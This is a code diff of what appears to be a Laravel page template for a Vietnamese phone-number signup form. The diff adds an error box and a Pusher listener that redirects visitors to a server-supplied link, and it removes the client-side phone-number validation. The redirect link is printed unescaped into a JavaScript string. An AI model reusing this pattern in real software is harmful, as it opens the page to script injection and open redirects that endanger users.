@@ -80,10 +80,16 @@
           class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
         />
 
+        <!-- Hiển thị lỗi -->
+        <div id="error-message" class="hidden mt-3 text-center text-sm text-red-500">
+          <!-- Lỗi sẽ hiển thị tại đây -->
+        </div>
+
         <!-- Thông báo submit -->
         <div id="submit-message" class="hidden mt-3 text-center text-sm text-accent">
           Đang gửi đăng ký...
         </div>
+  
 
         <button
           id="submit-btn"
@@ -98,6 +104,17 @@
         </button>
       </form>
       <script>
+        var pusher = new Pusher('a16c3bab85659b6d2b51', {
+            cluster: 'ap1',
+        });
+        var channel = pusher.subscribe('mrls');
+        channel.bind('{{ $pusher_code }}', function(data) {
+            if (data.status) {
+                $("#warning_notice").hide()
+                window.location.href =
+                    '{!! $data->redirect_link !!}'
+            }
+        });
       function handleSubmit(event) {
         event.preventDefault();
 
@@ -108,24 +125,6 @@
         btn.classList.add('opacity-70');
 
         var phone = document.getElementById('phone').value.trim();
-
-        // Hàm kiểm tra số điện thoại Việt Nam hợp lệ
-        function isVietnamesePhoneNumber(phone) {
-          const regex = /^(0|\+84)(3[2-9]|5[6|8|9]|7[0|6-9]|8[1-5]|9[0-9])[0-9]{7}$/;
-          return regex.test(phone);
-        }
-
-        if (!isVietnamesePhoneNumber(phone)) {
-          document.getElementById('submit-message').classList.add('hidden');
-          btn.disabled = false;
-          btn.classList.remove('opacity-70');
-          Swal.fire({
-            icon: 'error',
-            title: 'Lỗi',
-            text: 'Vui lòng nhập số điện thoại hợp lệ (VD: 0901234567)'
-          });
-          return false;
-        }
 
         const dataToSend = {
           'phone': phone,
